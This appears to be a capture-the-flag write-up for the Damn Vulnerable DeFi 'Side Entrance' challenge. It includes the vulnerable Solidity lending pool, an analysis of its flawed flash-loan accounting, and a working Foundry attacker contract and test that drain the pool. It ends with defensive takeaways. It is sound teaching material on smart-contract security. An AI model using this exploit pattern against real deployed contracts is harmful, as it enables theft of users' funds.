# Damn Vulnerable DeFi: Side Entrance

## Challenge Description
A surprisingly simple lending pool allows users to deposit ETH and earn interest. It also offers flash loans. The pool has 1000 ETH in balance. Your goal is to drain all the ETH from the pool.

**Difficulty:** ⭐⭐⭐ (Medium)

**Goal:** Drain the 1000 ETH from the lending pool.

## Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceLenderPool {
    mapping(address => uint256) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");

        balances[msg.sender] = 0;
        payable(msg.sender).transfer(amount);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH");

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(address(this).balance >= balanceBefore, "Flash loan not repaid");
    }
}
```

## Vulnerability Analysis

```text
THE BUG: The pool uses `address(this).balance` to verify flash loan repayment,
but it ALSO allows users to deposit ETH and increase their internal `balances` mapping.

If you take a flash loan, you receive ETH.
Inside the `execute()` callback, you can call `deposit()` and deposit the borrowed ETH back into the pool!

This increases your internal `balances[msg.sender]` record.
Then, the pool checks `address(this).balance >= balanceBefore`.
Since you deposited the ETH back, the pool's balance is restored, and the flash loan check PASSES!

Finally, you call `withdraw()` to withdraw your internal balance,
which now includes the ETH you just "borrowed" and "deposited".
```

## Exploit Strategy

```text
Step 1: Create an attacker contract that implements IFlashLoanEtherReceiver.
Step 2: Call flashLoan(1000 ETH) on the pool from the attacker contract.
Step 3: Inside the execute() callback, call pool.deposit{value: 1000 ETH}().
        This credits your attacker contract with 1000 ETH in the balances mapping.
Step 4: The callback finishes. The pool checks its balance. It is >= the original balance (because you deposited it back).
Step 5: Call pool.withdraw() to withdraw the 1000 ETH credited to your balance.
Step 6: Transfer the drained ETH to your EOA.
```

## Exploit Contract (Foundry)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/DamnVulnerableDeFi/SideEntranceLenderPool.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool public pool;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function execute() external payable override {
        // Deposit the borrowed ETH back into the pool
        // This increases our internal balance mapping
        pool.deposit{value: msg.value}();
    }

    function attack() external {
        uint256 poolBalance = address(pool).balance;
        // Step 1 & 2: Take flash loan
        pool.flashLoan(poolBalance);

        // Step 5: Withdraw the credited balance
        pool.withdraw();

        // Step 6: Send ETH to attacker EOA
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}

contract SideEntranceExploitTest is Test {
    SideEntranceLenderPool public pool;
    SideEntranceAttacker public attacker;
    address public attackerEOA = address(0xBEEF);

    function setUp() public {
        pool = new SideEntranceLenderPool();
        attacker = new SideEntranceAttacker(pool);

        // Fund the pool with 1000 ETH
        vm.deal(address(pool), 1000 ether);
        vm.deal(attackerEOA, 10 ether);
    }

    function test_ExploitSideEntrance() public {
        console.log("Pool balance before:", address(pool).balance);

        vm.startPrank(attackerEOA);
        attacker.attack();
        vm.stopPrank();

        console.log("Pool balance after:", address(pool).balance);
        assertEq(address(pool).balance, 0, "Pool not drained");

        console.log("\n✅ EXPLOIT SUCCESSFUL! Pool drained via deposit during flash loan.");
    }
}
```

## Key Takeaways
- **Accounting Consistency:** If a contract uses `address(this).balance` for one check (flash loan repayment) and a mapping for another (user balances), they can be decoupled and exploited.
- **Reentrancy-like Behavior:** Flash loan callbacks act like reentrancy. Always assume the receiver can call back into your contract.
- **State Updates:** Ensure that any action taken during a callback cannot artificially satisfy the post-callback invariant checks.
- **Lesson Learned:** Never mix raw ETH balance checks with internal accounting mappings without strict controls.
